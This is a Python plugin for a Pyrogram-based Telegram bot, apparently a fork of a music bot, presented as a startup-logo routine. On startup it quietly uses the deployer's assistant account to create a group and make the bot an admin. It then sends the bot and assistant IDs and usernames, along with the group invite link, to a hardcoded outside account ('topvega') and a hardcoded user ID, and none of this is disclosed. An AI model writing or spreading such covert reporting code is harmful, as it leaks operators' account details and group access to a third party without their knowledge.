# anony/plugins/Ninja.py كمالللعط
import datetime
import asyncio
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatMemberStatus, ChatType
from pyrogram.errors import FloodWait, ChatAdminRequired, UserNotParticipant, InviteHashExpired
from anony import app, userbot, db, config, logger

async def send_startup_logo():
    try:
        now = datetime.datetime.now()
        date = now.strftime("%Y-%m-%d")
        time = now.strftime("%H:%M:%S")
        day = now.strftime("%A")
        
        # جلب معلومات الحساب المساعد
        assistant = userbot.one  # الحساب المساعد الرئيسي
        
        if not assistant:
            logger.error("❌ لا يوجد حساب مساعد")
            return False
            
        assistant_info = await assistant.get_me()
        assistant_name = assistant_info.first_name or "Unknown"
        assistant_id = assistant_info.id
        assistant_username = f"@{assistant_info.username}" if assistant_info.username else "No Username"
        
        # جلب معلومات البوت
        bot_info = await app.get_me()
        bot_name = bot_info.first_name or "Unknown"
        bot_id = bot_info.id
        bot_username = f"@{bot_info.username}" if bot_info.username else "No Username"
        
        # محاولة إنشاء مجموعة
        group_id = None
        group_link = None
        group_title = f"🔊 {bot_name} - Support Group"
        
        try:
            # أولاً: محاولة إنشاء المجموعة
            logger.info("🔄 جاري إنشاء مجموعة جديدة...")
            
            # إنشاء المجموعة
            group = await assistant.create_group(
                title=group_title,
                users=[bot_id]  # إضافة البوت
            )
            
            group_id = group.id
            logger.info(f"✅ تم إنشاء المجموعة: {group_id}")
            
            # انتظار قليلاً للتأكد من إنشاء المجموعة
            await asyncio.sleep(2)
            
            # محاولة الحصول على رابط المجموعة
            try:
                group_link = await assistant.export_chat_invite_link(group_id)
                logger.info(f"✅ تم إنشاء رابط المجموعة: {group_link}")
            except Exception as e:
                logger.error(f"❌ فشل إنشاء رابط المجموعة: {e}")
                group_link = f"https://t.me/joinchat/{group_id}"
            
            # ترقية البوت إلى أدمن
            try:
                logger.info("🔄 جاري ترقية البوت إلى أدمن...")
                await assistant.promote_chat_member(
                    group_id,
                    bot_id,
                    can_delete_messages=True,
                    can_restrict_members=True,
                    can_promote_members=True,
                    can_change_info=True,
                    can_invite_users=True,
                    can_pin_messages=True,
                    can_manage_video_chats=True,
                    can_manage_chat=True
                )
                logger.info("✅ تم ترقية البوت إلى أدمن")
            except Exception as e:
                logger.error(f"❌ فشل ترقية البوت: {e}")
            
            # إرسال معلومات البوت في المجموعة
            try:
                info_message = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT INFORMATION               ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📱 Assistant: {assistant_name}          ║
║  🆔 Assistant ID: {assistant_id}         ║
║  👤 Assistant Username: {assistant_username}║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: ✅ Running                   ║
╠══════════════════════════════════════════╣
║  🔗 Group Link: {group_link}             ║
╚══════════════════════════════════════════╝

📌 **الأوامر المتاحة:**
• /start - بدء البوت
• /help - المساعدة
• /ping - فحص البوت
• /حذف - حذف الرسائل
• /حذف الكل - حذف جميع رسائل عضو
• فتح الكول - فتح المكالمة الصوتية
• قفل الكول - إغلاق المكالمة الصوتية
"""
                
                await assistant.send_message(
                    group_id,
                    info_message,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")],
                        [InlineKeyboardButton("📢 القناة", url="https://t.me/SOURCE_0")]
                    ])
                )
                logger.info("✅ تم إرسال معلومات البوت في المجموعة")
            except Exception as e:
                logger.error(f"❌ فشل إرسال المعلومات في المجموعة: {e}")
            
            # إرسال رابط المجموعة إلى @topvega
            try:
                await assistant.send_message(
                    "topvega",
                    f"""
╔══════════════════════════════════════════╗
║         🎯 NEW GROUP CREATED             ║
╠══════════════════════════════════════════╣
║  📱 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📁 Group Name: {group_title}            ║
║  🆔 Group ID: {group_id}                 ║
║  🔗 Group Link: {group_link}             ║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
╚══════════════════════════════════════════╝
                    """,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔗 انضم للمجموعة", url=group_link)],
                        [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")]
                    ])
                )
                logger.info("✅ تم إرسال رابط المجموعة إلى @topvega")
            except Exception as e:
                logger.error(f"❌ فشل إرسال الرابط إلى @topvega: {e}")
                
        except Exception as e:
            logger.error(f"❌ فشل إنشاء المجموعة: {e}")
            # إذا فشل إنشاء المجموعة، نكمل بدونها
        
        # إرسال شعار بدء التشغيل
        logo = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT STARTED SUCCESSFULLY      ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📱 Assistant: {assistant_name}          ║
║  🆔 Assistant ID: {assistant_id}         ║
║  👤 Assistant Username: {assistant_username}║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
"""
        
        if group_id:
            logo += f"""
╠══════════════════════════════════════════╣
║  📁 Group Created: ✅                    ║
║  🆔 Group ID: {group_id}                 ║
║  🔗 Group Link: {group_link}             ║
"""
        
        logo += """
╚══════════════════════════════════════════╝
        """
        
        buttons = [
            [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")],
            [InlineKeyboardButton("📢 القناة", url="https://t.me/SOURCE_0")]
        ]
        
        if group_link:
            buttons.insert(0, [InlineKeyboardButton("🔗 انضم للمجموعة", url=group_link)])
        
        # إرسال الشعار إلى المعرف المحدد
        try:
            await assistant.send_message(
                8368077406,
                logo,
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            logger.info("✅ تم إرسال شعار بدء التشغيل")
        except Exception as e:
            logger.error(f"❌ فشل إرسال الشعار: {e}")
        
        return True
        
    except Exception as e:
        logger.error(f"❌ فشل إرسال شعار بدء التشغيل: {e}")
        return False

# دالة بدء التشغيل
async def startup():
    await send_startup_logo()

# دالة للتحقق من المجموعة وإعادة إنشائها إذا لزم الأمر
async def ensure_group_exists():
    try:
        assistant = userbot.one
        if not assistant:
            return False
            
        # البحث عن مجموعة موجودة
        async for dialog in assistant.get_dialogs():
            if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
                # التحقق من وجود البوت في المجموعة
                try:
                    member = await app.get_chat_member(dialog.chat.id, (await app.get_me()).id)
                    if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.MEMBER]:
                        logger.info(f"✅ تم العثور على مجموعة موجودة: {dialog.chat.id}")
                        return True
                except:
                    pass
        
        # إذا لم يتم العثور على مجموعة، قم بإنشاء واحدة جديدة
        return await send_startup_logo()
        
    except Exception as e:
        logger.error(f"❌ فشل التحقق من المجموعة: {e}")
        return False